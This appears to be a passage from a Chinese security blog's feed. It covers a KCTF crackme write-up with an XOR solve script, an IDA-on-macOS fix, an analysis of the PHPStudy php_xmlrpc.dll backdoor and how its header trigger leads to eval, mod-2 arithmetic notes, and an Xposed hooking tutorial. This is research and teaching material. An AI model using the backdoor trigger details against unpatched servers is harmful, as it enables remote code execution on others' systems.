如果函数调用成功则返回值为在对函数EndDialog的调用中的nResult参数，该EndDialog函数用于中止对话框。如果函数调用失败，则返回值为<span class="number">-1</span>。</span><br></pre></td></tr></table></figure><h5 id="F5大法定位关键代码"><a href="#F5大法定位关键代码" class="headerlink" title="F5大法定位关键代码"></a>F5大法定位关键代码</h5><p><img src="/images/pasted-155.png" alt="upload successful"></p><p><img src="/images/pasted-156.png" alt="upload successful"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">函数功能：该函数获取对话框中与控制有关的文本或标题。</span><br><span class="line">函数原型</span><br><span class="line">    <span class="function">UINT <span class="title">GetDlgltemText</span><span class="params">(HWND hDlg,<span class="keyword">int</span> nlDDlltem,LPTSTR IpString <span class="keyword">int</span> nMazCount)</span></span>;</span><br><span class="line">参数</span><br><span class="line">    hDlg       指向含有控制的对话框的句柄。</span><br><span class="line">    nlDDlgltem 指定标题或文本将被检索的控制的标识符。</span><br><span class="line">    IpString   指向获取标题或文本的缓冲器的指针。</span><br><span class="line">    nMaxCount  指定被复制到lpString参数指向的缓冲区的字符串的最大长度。如果字符串的字符最大长度超过范围，则该字符串被截断。</span><br><span class="line">返回值 如果函数调用成功，则返回值表示被复制缓冲区的字符串的长度，不包括以<span class="literal">NULL</span>结尾的字符串。如果函数调用失败,则返回值为零。若想获得更多错误信息，请调用GetLastError函数。</span><br></pre></td></tr></table></figure><blockquote><p>得到注册码为6Ewi9H</p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-157.png" alt="upload successful"></p><hr><h3 id="Exam"><a href="#Exam" class="headerlink" title="Exam"></a>Exam</h3><p><img src="/images/pasted-158.png" alt="upload successful"></p><h4 id="OD调试之"><a href="#OD调试之" class="headerlink" title="OD调试之"></a>OD调试之</h4><p><img src="/images/pasted-159.png" alt="upload successful"></p><blockquote><p>通过字符串找到关键点</p></blockquote><p><img src="/images/pasted-160.png" alt="upload successful"></p><blockquote><p>可以看出来一些流程，输入字符串，得到长度，然后判断是否在10～30之间，将字符串copy到另外一个地方，比较字符串的第八个位置是否为’A’。</p></blockquote><p><img src="/images/pasted-161.png" alt="upload successful"></p><blockquote><p>进入此函数</p></blockquote><p><img src="/images/pasted-162.png" alt="upload successful"></p><blockquote><p>该函数的逻辑是：将输入的第七个字符串换成’#’，字符串的每位都与0x1F进行xor运算。然后下面没有思路了</p></blockquote><h4 id="IDA查看之"><a href="#IDA查看之" class="headerlink" title="IDA查看之"></a>IDA查看之</h4><p><img src="/images/pasted-163.png" alt="upload successful"></p><blockquote><p>找到字符串(将字符串复制到的地址)的交叉引用，挨个扫一眼</p></blockquote><p><img src="/images/pasted-164.png" alt="upload successful"></p><blockquote><p>可以看到这一个函数</p></blockquote><p><img src="/images/pasted-165.png" alt="upload successful"></p><blockquote><p>找到该函数的交叉引用</p></blockquote><p><img src="/images/pasted-166.png" alt="upload successful"></p><blockquote><p>可以看到第二个参数就是’invalid argument’</p></blockquote><p><img src="/images/pasted-167.png" alt="upload successful"></p><blockquote><p>关键比较处，a2就是’invalid argument’ ^ 28后的结果，dword_2F3088就是我们输入字符串复制到的地址</p></blockquote><blockquote><p>在关键部分下断点，可以得到比较的字符串</p></blockquote><p><img src="/images/pasted-168.png" alt="upload successful"></p><blockquote><p>到此，程序整体逻辑也就明了了，输入字符串，判断第八位是否为A，将第八位换成#，整体字符在与 0x1f 异或，得到的字符 和 ‘invalid argument’与28异或后的结果相比较</p></blockquote><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [1]: flag = <span class="string">"invalid argument"</span></span><br><span class="line">In [2]: temp = <span class="string">''</span></span><br><span class="line">In [3]: <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(flag)):</span><br><span class="line">   ...:     temp += chr(ord(flag[i]) ^ 28)</span><br><span class="line">In [4]: temp</span><br><span class="line">Out[4]: <span class="string">'urj&#125;pux&lt;&#125;n&#123;iqyrh'</span></span><br><span class="line">In [5]: <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(temp)):</span><br><span class="line">   ...:     flag += chr(ord(temp[i]) ^ 0x1f)</span><br><span class="line">In [6]: flag = <span class="string">''</span></span><br><span class="line">In [7]: <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(temp)):</span><br><span class="line">   ...:     flag += chr(ord(temp[i]) ^ 0x1f)</span><br><span class="line">In [8]: flag</span><br><span class="line">Out[8]: <span class="string">'jmubojg#bqdvnfmw'</span></span><br><span class="line"><span class="comment"># 最后将#换成'A'即可</span></span><br></pre></td></tr></table></figure><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-169.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>KCTF的题目质量是真的好，准备把这几年的比赛题目都拿来做做，学习学习，还是有很多姿势的。。。。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h3 id=&quot;初世纪&quot;&gt;&lt;a href=&quot;#初世纪&quot; class=&quot;headerlink&quot; title=&quot;初世纪&quot;&gt;&lt;/a&gt;初世纪&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-152.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MacOS IDA pro-致最傻的我 </title>
    <link href="https://bufsnake.github.io/MacOS-IDA-pro-%E8%87%B4%E6%9C%80%E5%82%BB%E7%9A%84%E6%88%91.html"/>
    <id>https://bufsnake.github.io/MacOS-IDA-pro-致最傻的我.html</id>
    <published>2019-09-30T13:04:55.000Z</published>
    <updated>2019-09-30T13:25:11.301Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才知道是个啥情况，这里简单记录一下。</p></blockquote><h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><p><img src="/images/pasted-145.png" alt="upload successful"></p><blockquote><p>第一次遇到文件权限后门带@的，以为是这个问题，然后就疯狂Google，才得知这是Mac OS X文件系统的附加属性</p></blockquote><blockquote><p>文件的读写权限中被加上了一个@符号，这就是 Mac OS X 文件系统的附加属性（extended attributes）</p></blockquote><blockquote><p>这个属性下，打开文件显示错误为：项目“XXX”已被OS X 使用，不能打开</p></blockquote><h4 id="xattr"><a href="#xattr" class="headerlink" title="xattr"></a>xattr</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xattr -c filename <span class="comment"># 可以清除这个附加属性</span></span><br></pre></td></tr></table></figure><blockquote><p>天真的以为清除附加属性后，打开就没有问题了，然而，我错了。还是没能解决</p></blockquote><h3 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h3><p><img src="/images/pasted-146.png" alt="upload successful"></p><p><img src="/images/pasted-147.png" alt="upload successful"></p><blockquote><p>出现签名的问题，然后又是一番疯狂Google</p></blockquote><p><img src="/images/pasted-148.png" alt="upload successful"></p><blockquote><p>允许应用控制电脑，所以每次打开应用Mac OS X都会检测程序的签名问题。可能是因为我的IDA补丁的问题。</p></blockquote><p><img src="/images/pasted-149.png" alt="upload successful"></p><blockquote><p>取消勾选 允许应用控制电脑 即可解决问题。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>困扰了有两个月了，搞得我都对那个程序有些恐惧，都不想打开它，今天终于解决了。学到姿势了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才
      
    
    </summary>
    
      <category term="misc" scheme="https://bufsnake.github.io/categories/misc/"/>
    
    
      <category term="MacOS IDA" scheme="https://bufsnake.github.io/tags/MacOS-IDA/"/>
    
  </entry>
  
  <entry>
    <title>PHPStudy后门研究</title>
    <link href="https://bufsnake.github.io/PHPStudy%E5%90%8E%E9%97%A8%E7%A0%94%E7%A9%B6.html"/>
    <id>https://bufsnake.github.io/PHPStudy后门研究.html</id>
    <published>2019-09-25T04:07:14.000Z</published>
    <updated>2019-09-25T05:22:17.272Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote><hr><h3 id="PHPStudy-后门文件"><a href="#PHPStudy-后门文件" class="headerlink" title="PHPStudy 后门文件"></a>PHPStudy 后门文件</h3><blockquote><p>php/ext目录下的php_xmlrpc.dll文件 。</p></blockquote><p><img src="/images/pasted-139.png" alt="upload successful"></p><h3 id="检测是否存在后门"><a href="#检测是否存在后门" class="headerlink" title="检测是否存在后门"></a>检测是否存在后门</h3><blockquote><p>记事本打开文件，查看是否存在如下所示的字符串，如果有说明存在后门，可升级官方最新版。</p></blockquote><p><img src="/images/pasted-140.png" alt="upload successful"></p><h3 id="IDA分析后门文件"><a href="#IDA分析后门文件" class="headerlink" title="IDA分析后门文件"></a>IDA分析后门文件</h3><blockquote><p>根据字符串信息，快速定位关键函数</p></blockquote><p><img src="/images/pasted-141.png" alt="upload successful"></p><p><img src="/images/pasted-142.png" alt="upload successful"></p><p><img src="/images/pasted-143.png" alt="upload successful"></p><blockquote><p>根据判断请求头的Accept-Encoding是否为gzip,deflate进行判断Accept-Charset的值base64解密是否成功，如果成功就对它进行gzcompress压缩，然后执行@eval(gzuncompress(data));</p></blockquote><h3 id="相关检测脚本"><a href="#相关检测脚本" class="headerlink" title="相关检测脚本"></a>相关检测脚本</h3><blockquote><p>github已经有大佬上传了，需要研究学习的朋友，可以自己搜索</p></blockquote><hr><blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;PHPStudy-后门文件&quot;&gt;&lt;a href=&quot;#PHPStudy-后门文件&quot; cl
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="phpstudy后门" scheme="https://bufsnake.github.io/tags/phpstudy%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>模2运算</title>
    <link href="https://bufsnake.github.io/%E6%A8%A12%E8%BF%90%E7%AE%97.html"/>
    <id>https://bufsnake.github.io/模2运算.html</id>
    <published>2019-09-17T10:13:39.000Z</published>
    <updated>2019-09-17T12:07:22.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="模2运算"><a href="#模2运算" class="headerlink" title="模2运算"></a>模2运算</h2><blockquote><p>简介：将数字换算成二进制的形式进行运算，无进位也无借位。</p></blockquote><h2 id="模2加法"><a href="#模2加法" class="headerlink" title="模2加法"></a>模2加法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> + <span class="number">0</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> + <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> + <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">1010101</span></span><br><span class="line">+   <span class="number">1000101</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">0010000</span></span><br><span class="line"> </span><br><span class="line">    <span class="number">10101011</span></span><br><span class="line">+   <span class="number">10100111</span></span><br><span class="line">+   <span class="number">11100010</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">11101110</span></span><br><span class="line"></span><br><span class="line">奇数个<span class="number">1</span>相加得<span class="number">1</span>，偶数个<span class="number">1</span>相加得<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="模2减法"><a href="#模2减法" class="headerlink" title="模2减法"></a>模2减法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> - <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> - <span class="number">0</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> - <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> - <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">1010101</span></span><br><span class="line">-   <span class="number">1000101</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">0010000</span></span><br><span class="line">    </span><br><span class="line">    <span class="number">10101011</span></span><br><span class="line">-   <span class="number">10100111</span></span><br><span class="line">-   <span class="number">11100010</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">11101110</span></span><br></pre></td></tr></table></figure><h2 id="模2乘法"><a href="#模2乘法" class="headerlink" title="模2乘法"></a>模2乘法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> x <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">1</span> x <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"><span class="number">0</span> x <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">0</span> x <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">1010101</span></span><br><span class="line">x   <span class="number">1000101</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">1000101</span></span><br></pre></td></tr></table></figure><h2 id="模2除法"><a href="#模2除法" class="headerlink" title="模2除法"></a>模2除法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">运算的时候每位都进行xor运算</span><br><span class="line">规则：被除数除以除数,被除数首位为<span class="number">1</span>时,商<span class="number">1</span>,为<span class="number">0</span>时商<span class="number">0</span></span><br><span class="line">     所得余数去除首位(左移一位)</span><br><span class="line">     重复上一步直到被除数位数少于除数位数</span><br><span class="line">例子：<span class="number">1111000</span>对除数<span class="number">1101</span>做模<span class="number">2</span>除法:</span><br><span class="line">         <span class="number">1011</span>             商</span><br><span class="line">     ------------</span><br><span class="line"><span class="number">1101</span>/ <span class="number">1111000</span>             被除数 首位为<span class="number">1</span>，商为<span class="number">1</span></span><br><span class="line">      <span class="number">1101</span>                除数</span><br><span class="line">     ------------</span><br><span class="line">      <span class="number">0010000</span>             余数去除首位,作为新的被除数，首位为<span class="number">0</span>，商为<span class="number">0</span></span><br><span class="line">       <span class="number">0000</span>               被除数首位为<span class="number">0</span>，则除数就为<span class="number">0</span></span><br><span class="line">     ------------</span><br><span class="line">       <span class="number">010000</span>             余数去除首位,作为新的被除数，首位为<span class="number">1</span>，商为<span class="number">1</span></span><br><span class="line">        <span class="number">1101</span>              被除数首位为<span class="number">1</span>,除以除数 </span><br><span class="line">     ------------</span><br><span class="line">        <span class="number">01010</span>             余数去除首位,作为新的被除数，首位为<span class="number">1</span>，商为<span class="number">1</span></span><br><span class="line">         <span class="number">1101</span>             被除数首位为<span class="number">1</span>,除以除数  </span><br><span class="line">     ------------</span><br><span class="line">         <span class="number">0111</span>             余数去除首位，为<span class="number">111</span>位数为<span class="number">3</span>，小于除数位数<span class="number">4</span>，不再进行运算，得到结果</span><br><span class="line">结果：商<span class="number">1011</span>余<span class="number">111</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;模2运算&quot;&gt;&lt;a href=&quot;#模2运算&quot; class=&quot;headerlink&quot; title=&quot;模2运算&quot;&gt;&lt;/a&gt;模2运算&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;简介：将数字换算成二进制的形式进行运算，无进位也无借位。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
      <category term="crypto" scheme="https://bufsnake.github.io/categories/crypto/"/>
    
    
      <category term="misc" scheme="https://bufsnake.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Xposed hook框架学习</title>
    <link href="https://bufsnake.github.io/Xposed-hook%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://bufsnake.github.io/Xposed-hook框架学习.html</id>
    <published>2019-09-09T10:11:11.000Z</published>
    <updated>2019-09-09T10:55:16.766Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Xposed-安装"><a href="#Xposed-安装" class="headerlink" title="Xposed 安装"></a>Xposed 安装</h3><p><a href="http://dl-xda.xposed.info/modules/de.robv.android.xposed.installer_v33_36570c.apk" target="_blank" rel="noopener">xposed.apk</a></p><p><img src="/images/pasted-127.png" alt="upload successful"></p><h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p><img src="/images/pasted-128.png" alt="upload successful"></p><blockquote><p>初次运行是点击 安装/更新 就行了，后续在激活模块的时候可以点击 软重启 重启手机(模拟器)</p></blockquote><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p><img src="/images/pasted-129.png" alt="upload successful"></p><blockquote><p>显示已安装的模块，打勾的说明是已经激活的</p></blockquote><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><img src="/images/pasted-130.png" alt="upload successful"></p><blockquote><p>显示网上已经有的模块，别人开发好的，可以直接拿过来用的那种</p></blockquote><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p><img src="/images/pasted-131.png" alt="upload successful"></p><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p><img src="/images/pasted-132.png" alt="upload successful"></p><blockquote><p>显示模块运行时后的日志信息，可用来显示XposedBridge.log(“”);打印出来的消息</p></blockquote><h4 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h4><p><img src="/images/pasted-133.png" alt="upload successful"></p><h3 id="第一个模块学习"><a href="#第一个模块学习" class="headerlink" title="第一个模块学习"></a>第一个模块学习</h3><h4 id="在build-gradle中添加信息"><a href="#在build-gradle中添加信息" class="headerlink" title="在build.gradle中添加信息"></a>在build.gradle中添加信息</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compileOnly <span class="string">'de.robv.android.xposed:api:82'</span></span><br><span class="line">compileOnly <span class="string">'de.robv.android.xposed:api:82:sources'</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-134.png" alt="upload successful"></p><blockquote><p>导入框架需要的依赖</p></blockquote><h4 id="AndroidManifest-xml添加如下信息"><a href="#AndroidManifest-xml添加如下信息" class="headerlink" title="AndroidManifest.xml添加如下信息"></a>AndroidManifest.xml添加如下信息</h4><p><img src="/images/pasted-135.png" alt="upload successful"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span>        该程序是否是<span class="attr">xposed</span>的模块</span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span>   对本模块的功能的描述，可以自己简单的描述一下可以了</span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"Module测试"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span>    是本模块开发时用到的<span class="attr">Xposed</span>的<span class="attr">jar</span>包最低版本号</span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"54"</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意该段代码的放置位置</p></blockquote><h4 id="添加模块的入口函数"><a href="#添加模块的入口函数" class="headerlink" title="添加模块的入口函数"></a>添加模块的入口函数</h4><p><img src="/images/pasted-136.png" alt="upload successful"></p><p><img src="/images/pasted-137.png" alt="upload successful"></p><blockquote><p>新建一个类，为Xposed模块的主类，新建一个assets目录，在目录下创建一个file xposed_init，里面添上模块入口函数的路径</p></blockquote><h4 id="编写模块的主要代码"><a href="#编写模块的主要代码" class="headerlink" title="编写模块的主要代码"></a>编写模块的主要代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lpparam.packageName.equals(<span class="string">"com.example.helloworld"</span>))&#123;</span><br><span class="line"></span><br><span class="line">            XposedHelpers.findAndHookMethod(TextView.class, <span class="string">"setText"</span>,CharSequence.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    param.args[<span class="number">0</span>] = <span class="string">"isHookedbe"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    param.args[<span class="number">0</span>] = <span class="string">"isHookedaf"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>作用是HOOK TextView的setText方法</p></blockquote><h4 id="被Hook的程序的MainActivity"><a href="#被Hook的程序的MainActivity" class="headerlink" title="被Hook的程序的MainActivity"></a>被Hook的程序的MainActivity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.helloworld;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Button b;</span><br><span class="line">    <span class="keyword">private</span> TextView t;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        b = (Button)findViewById(R.id.button);</span><br><span class="line">        t = (TextView)findViewById(R.id.textView);</span><br><span class="line"></span><br><span class="line">        b.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                t.setText(<span class="string">"aaaaaaaaaaaaaaa"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在点击程序后本应该会显示aaaaaaaaaaaaaaa，hook之后会显示isHookedbe</p></blockquote><h4 id="看图"><a href="#看图" class="headerlink" title="看图"></a>看图</h4><p><img src="/images/pasted-138.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>先Hook成功一个案例，然后实现各种操作吧，可以看看官方的api</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Xposed-安装&quot;&gt;&lt;a href=&quot;#Xposed-安装&quot; class=&quot;headerlink&quot; title=&quot;Xposed 安装&quot;&gt;&lt;/a&gt;Xposed 安装&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://dl-xda.xposed.info/modules
      
    
    </summary>
    
      <category term="android" scheme="https://bufsnake.github.io/categories/android/"/>
    
    
      <category term="xposed框架" scheme="https://bufsnake.github.io/tags/xposed%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>frida Hook神器学习-1</title>
